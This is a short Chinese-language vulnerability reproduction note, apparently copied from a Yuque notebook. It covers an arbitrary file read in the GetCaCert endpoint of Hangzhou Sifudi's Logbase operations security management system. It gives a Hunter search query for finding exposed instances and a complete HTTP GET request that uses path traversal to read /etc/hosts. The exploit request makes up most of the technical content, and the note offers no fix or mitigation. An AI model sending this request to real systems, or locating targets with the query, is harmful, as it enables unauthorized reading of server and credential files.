# 思福迪运维安全管理系统 GetCaCert存在任意文件读取漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">为满足用户对加强内部运维安全审计日益迫切的需要，杭州思福迪信息技术有限公司依托自身强大的研发能力，丰富的行业经验，自主研发了新一代软硬件一体化运维安全专用审计系统——Logbase运维安全管理系统。该系统支持对企业内部人员的维护行为进行全面的管理、审计，消除了传统审计系统中的盲点，使企业对运维人员的操作过程，能做到事前防范、事中控制、事后审计的能力，是企业IT内控最有效的运维管理平台。思福迪运维安全管理系统 GetCaCert存在任意文件读取漏洞。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 思福迪运维安全管理系统

# 三、资产测绘
+ hunter`app.name="Logbase 思福迪 运维安全系统"`
+ 特征

![1705244115545-ef7957e0-49a0-446a-af00-94cbec4e0d11.png](./img/q1E9jTVPnh7ZkQF_/1705244115545-ef7957e0-49a0-446a-af00-94cbec4e0d11-586111.png)

# 四、漏洞复现
```plain
GET /bhost/GetCaCert?a1=../../../../../etc/hosts HTTP/1.1
Host: 
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: gzip
Accept-Encoding: gzip, deflate, br
Content-Length: 0
```

![1705244843495-07e1b54b-81e9-4119-8b8f-0af9b5fdba17.png](./img/q1E9jTVPnh7ZkQF_/1705244843495-07e1b54b-81e9-4119-8b8f-0af9b5fdba17-171121.png)

![1705244860034-ecd21dc6-093f-4b2e-b277-97580ea1b8db.png](./img/q1E9jTVPnh7ZkQF_/1705244860034-ecd21dc6-093f-4b2e-b277-97580ea1b8db-040679.png)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wuf31x217y4a3dvr>